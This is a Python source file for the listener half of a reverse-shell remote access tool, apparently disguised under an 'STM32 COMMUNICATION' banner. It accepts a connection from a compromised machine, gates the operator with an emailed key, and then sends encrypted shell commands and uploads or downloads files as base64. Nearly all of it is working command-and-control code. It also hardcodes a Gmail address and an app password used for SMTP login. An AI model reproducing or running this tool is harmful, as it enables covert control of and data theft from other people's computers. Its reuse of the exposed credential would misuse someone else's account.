import socket
import simplejson
import termcolor
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import ssl
import create_key as create_key
import time
import itertools
import threading
import sys
import os
import base64

class Listener():
    def __init__(self):
        ip_from_user,port_from_user = self.listen_your_local()
        listener_for_pc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_for_pc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        listener_for_pc.bind((ip_from_user,port_from_user))
        listener_for_pc.listen(0)
        (self.connection,self.address) = listener_for_pc.accept()
        print(f"connection OK from {self.address}")
        


    def json_send(self,data):
        jason_data = simplejson.dumps(data)
        self.connection.send(jason_data.encode('utf-8'))
        
    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return simplejson.loads(json_data)
            except ValueError as e:
                print(f"Error {e}")
                continue

    def banner_func(self):
        print(termcolor.colored(self.banner,color="light_green") + "\n" + termcolor.colored("Developed by Egemen 2024 ©".center(2),color="light_blue"))

    def get_user_email(self):
        while True:
            before_email = input("please enter your email:")
            if before_email == "":
                print(termcolor.colored("this valid not to be None",on_color="on_light_red"))
                continue            
            os.system('clear')
            return before_email

    def listen_your_local(self):
        while True:
            ip = input("please enter your ip address:")
            if ip == "":
                print(termcolor.colored("this valid not to be None",on_color="on_light_red"))
                continue
            else:
                port = int(input("please enter your port:"))
                if port == "":
                    print(termcolor.colored("this valid not to be None",on_color="on_light_red"))
                    continue
            return ip,port

    def connect_to_pc(self):
        while True:
            ip = input("please enter destination ip address:")
            if ip == "":
                print(termcolor.colored("this valid not to be None",on_color="on_light_red"))
                continue
            else:
                port = int(input("please enter destinationport:"))
                if port == "":
                    print(termcolor.colored("this valid not to be None",on_color="on_light_red"))
                    continue
            return ip,port


    def send_email(self):
        getted_user_email = str(self.get_user_email())
        sender_email = "dsquad120@gmail.com"
        sender_password = "moex epbw nsvc ytoj "
        cipher,key = create_key.generated_key()
        subject = "special_cryptography_key"
        body = "KEY:{key}".format(key = cipher)

        about_email = MIMEMultipart()
        about_email["From"] = sender_email
        about_email["to"] = getted_user_email
        about_email["Subject"] = subject
        about_email.attach(MIMEText(body,'plain'))

        context_ssl = ssl.create_default_context()

        with smtplib.SMTP_SSL('smtp.gmail.com','465',context=context_ssl) as smtp_server:
            smtp_server.login(sender_email,sender_password)
            smtp_server.sendmail(sender_email,getted_user_email,about_email.as_string())
        done = False
        def animate():
            for c in itertools.cycle(['|', '/', '-', '\\']):
                if done:
                    break
                sys.stdout.write('\rloading ' + c)
                sys.stdout.flush()
                time.sleep(0.1)
            sys.stdout.write(termcolor.colored('Done!\n',on_color = "on_green"))

        t = threading.Thread(target=animate)
        t.start()

            #long process here
        time.sleep(10)
        done = True
        return cipher,key

    def command_exec(self,comman_input):
        self.json_send(comman_input)
        return self.json_recv()

    def save_file(self,path,content):
        with open(path,'wb') as file:
            file.write(base64.b64decode(content))
            return "Download Successfully"
    
    def get_file_content(self,path):
        try:
            with open(path,'rb') as file:
                return base64.b64encode(file.read())
        except FileNotFoundError as e:
            print(f"file does not exist {e}")
        
    def main_progress(self):
        cipher, key = self.send_email() 
        key_is_correct = False 

        while not key_is_correct:  
            user_input_key = input("Please enter key: ")
            print(user_input_key)
            if user_input_key == cipher.decode('utf-8'):
                print(termcolor.colored("Key Ok!", on_color="on_green"))
                key_is_correct = True  
            else:
                print(termcolor.colored("Key don't match", on_color="on_red"))
                continue  

        while True: 
            self.user_input = str(input("\ncommand >"))
            if not self.user_input:
                print(termcolor.colored("Received command not to be none!", color="red"))
                continue

            self.user_input = self.user_input.split(" ")

            if self.user_input[0] == "quit":
                self.connection.close()
                exit()

            if self.user_input[0] == "upload":
                # Dosya yolunu al ve dosya içeriğini base64 olarak al
                file_path = self.user_input[1]
                file_content = self.get_file_content(file_path)

                if file_content is not None:
                    # Dosya içeriğini base64 şifrele ve komut dizisine ekle
                    self.user_input.append(file_content.decode('utf-8'))

                else:
                    print(termcolor.colored(f"File {file_path} not found", color="red"))
                    continue

            # Komutu şifrele
            encrypted_input = [key.encrypt(part.encode('utf-8')) for part in self.user_input]

            # Komutları çalıştır
            command_output = self.command_exec(encrypted_input)

            if not command_output:
                print(termcolor.colored("Data Not Received!", color="red"))
                continue

            # Şifre çözme işlemi
            decrypted_output = key.decrypt(command_output)

            if self.user_input[0] == "download":
                # Dosya kaydetme işlemi
                command_output = self.save_file(self.user_input[1], decrypted_output)

            try:
                print(decrypted_output.decode('utf-8'))

            except UnicodeDecodeError as e:
                print(f"decode edilemedi {e}")
                continue
            

    
            
    banner = """

    .d8888b. 88888888888 888b     d888  .d8888b.   .d8888b.        .d8888b.   .d88888b.  888b     d888 888     888 888b    888 8888888 .d8888b.        d8888 88888888888 8888888 .d88888b.  888b    888 
    d88P  Y88b    888     8888b   d8888 d88P  Y88b d88P  Y88b      d88P  Y88b d88P" "Y88b 8888b   d8888 888     888 8888b   888   888  d88P  Y88b      d88888     888       888  d88P" "Y88b 8888b   888 
    Y88b.         888     88888b.d88888      .d88P        888      888    888 888     888 88888b.d88888 888     888 88888b  888   888  888    888     d88P888     888       888  888     888 88888b  888 
    "Y888b.      888     888Y88888P888     8888"       .d88P      888        888     888 888Y88888P888 888     888 888Y88b 888   888  888           d88P 888     888       888  888     888 888Y88b 888 
        "Y88b.    888     888 Y888P 888      "Y8b.  .od888P"       888        888     888 888 Y888P 888 888     888 888 Y88b888   888  888          d88P  888     888       888  888     888 888 Y88b888 
        "888    888     888  Y8P  888 888    888 d88P"           888    888 888     888 888  Y8P  888 888     888 888  Y88888   888  888    888  d88P   888     888       888  888     888 888  Y88888 
    Y88b  d88P    888     888   "   888 Y88b  d88P 888"            Y88b  d88P Y88b. .d88P 888   "   888 Y88b. .d88P 888   Y8888   888  Y88b  d88P d8888888888     888       888  Y88b. .d88P 888   Y8888 
    "Y8888P"     888     888       888  "Y8888P"  888888888        "Y8888P"   "Y88888P"  888       888  "Y88888P"  888    Y888 8888888 "Y8888P" d88P     888     888     8888888 "Y88888P"  888    Y888 
                                                                                                                                                                                                        
    """

listener_prog = Listener()
listener_prog.banner_func()
listener_prog.main_progress()


